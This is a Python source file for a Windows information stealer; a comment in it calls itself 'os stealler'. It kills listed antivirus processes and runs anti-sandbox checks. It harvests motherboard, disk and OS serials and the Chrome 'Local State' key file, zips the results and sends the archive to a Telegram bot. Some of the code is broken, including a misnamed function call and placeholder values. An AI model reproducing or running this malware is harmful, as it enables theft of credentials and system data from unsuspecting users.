import sys
import os
import wmi
import smtplib
import multiprocessing
import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
#import ctypes
import pyarmor
from pathlib import Path
import json
import requests
import string
import socket
import winreg
import psutil
import shutil
import zipfile
import asyncio
import cython
import re
import telebot

host = socket.gethostname()
user = socket.gethostbyname(host)
current_path = os.path.dirname(os.path.abspath(__file__))

x = re.search(user, current_path)

"""async def esc():
    try:
      with open('alt.txt','r') as r:
        with open('rig.py', 'w') as rw:
            for line1 in r:
                rw.write(line1)
    except:
      pass"""

def void_esc():
    try:
      with open('alt.txt','r') as r:
        with open('rig.py', 'w') as rw:
            for line1 in r:
                rw.write(line1)
    except:
      pass
API_KEY = '#'
bot = telebot.TeleBot(API_KEY)
    
if x and __name__ == '__main__' and sys.platform == 'win32' and os.name == 'nt':
 ip_addresses_ipv6 = []
 ip_addresses_ipv4 = []
 list_of_registered = []
 list_of_desktops = []
 list_of_ant = []

 alphabet = string.ascii_uppercase

 desktop_pc = socket.gethostname()
 ipv_4 = socket.gethostbyname(desktop_pc)

 user_name = getpass.getuser()

 class debugs:
  def processing():
    for process in psutil.process_iter():
     if process.name() in list_of_ant:
       try:
        process.kill()
       except:
         void_esc()
       
  @cython.locals(ipv_4=cython.char, ip_addresses_ipv4=cython.char)
  def ipvs4():
     if str(ipv_4) in str(ip_addresses_ipv4):
       try:
         void_esc()
       except:
         sys.exit()
  
  @cython.locals(key_path=cython.char, key1=cython.char, key_system_root=cython.char, key_currentversion=cython.char)
  def win_reg():
    key_path = r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\'
 
    key1 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
    key_system_root = winreg.QueryValueEx(key1, 'SystemRoot')
    winreg.CloseKey
    key_currentversion = winreg.QueryValueEx(key1, 'CurrentVersion')
    winreg.CloseKey
    
    if float(key_currentversion[0]) < float(6.4):
      try:
       void_esc()
      except:
       sys.exit()
       
  @cython.locals(r=cython.char, final_json=cython.char, ip_addresses_ipv6=cython.char)
  def all_files_json():
    try:
     r = requests.get('http://httpbin.org/get')
     res_json = r.json()
     final_json = res_json['origin']
     if str(final_json) in str(ip_addresses_ipv6):
       try:
         void_esc()
       except:
         sys.exit()
     return final_json
    except:
      pass
  
  final_json = all_files_json()
 debugs.processing()
 debugs.ipvs4()
 debugs.win_reg()
 debugs.all_files_json()
 
 class debg:
  @cython.locals(mother_board_str=cython.char,mother_board=cython.char,hardisk=cython.char,hardisk_str=cython.char,hd=cython.char,hd_str=cython.char,
                  hd_SerialNumber=cython.char,Registered=cython.char,multiprocessing_str=cython.char)
  def comps():
        try:
          c = wmi.WMI()

          for mother_board in c.Win32_BaseBoard():
             mother_board_str = mother_board.SerialNumber

          for hardisk in c.Win32_diskdrive():
            hardisk_str = hardisk.name
  
          for hd in c.Win32_OperatingSystem():
            hd_str = hd.BuildNumber
            hd_SerialNumber = hd.SerialNumber
            Registered = hd.RegisteredUser

          multiprocessing_str = multiprocessing.cpu_count()

          finalprocessing = mother_board_str, hardisk_str, hd_str, hd_SerialNumber, Registered, multiprocessing_str
          return finalprocessing
              
        except:
          pass

 #osstlst = os stealler start
  def osstlst():
    try: 
      for disk in psutil.disk_partitions():
        ab = disk.device
        os.chdir(f'{ab}\\Users\\stcst\\AppData\\Local\\Google\\Chrome\\User Data')
        if os.path.exists(f'{ab}\\Users\\stcst\\AppData\\Local\\Google\\Chrome\\User Data') == True:
          p = Path('Local State')
          p.rename(p.with_suffix('.json'))
          data = json.load(open('Local State.json'))
          LocalState_file = Path('Local State.json')
          LocalState_file.rename(LocalState_file.with_suffix(''))
          return data
    except: 
      pass

  async def ziparchv():
    try:
     os.chdir(current_path)
     with open('output.txt','w') as file:
      data = debg.osstlst()
      file.write(json.dumps(data))   
    except:
      pass
    try:
      os.chdir(current_path)
      with open('abc.txt','w') as file1:
       file1.write(', '.join(map(str,debg.comps())))
    except:
      pass
    task_archv = asyncio.create_task(debg.allof())
    await task_archv

  async def all_of():
    try:
     os.chdir(current_path)
     myzip = zipfile.ZipFile('all.zip','w')
     myzip.write('output.txt')
     myzip.write('abc.txt')
     myzip.close()
    except:
      sys.exit()
 asyncio.run(debg.ziparchv())

 class tele_id:
  @bot.message_handler(commands=['Greet'])
  def greet(message):
    try:
     os.chdir(current_path)
     file_tele = open('all.zip', 'rb')
     bot.send_document(message.chat.id,file_tele)

     bot.polling()
    except:
      pass
 tele_id.greet()
else:
  try: 
    void_esc()
  except:
    sys.exit()

#os.remove('all.zip')
#os.remove('output.txt')
#os.remove('input.txt')
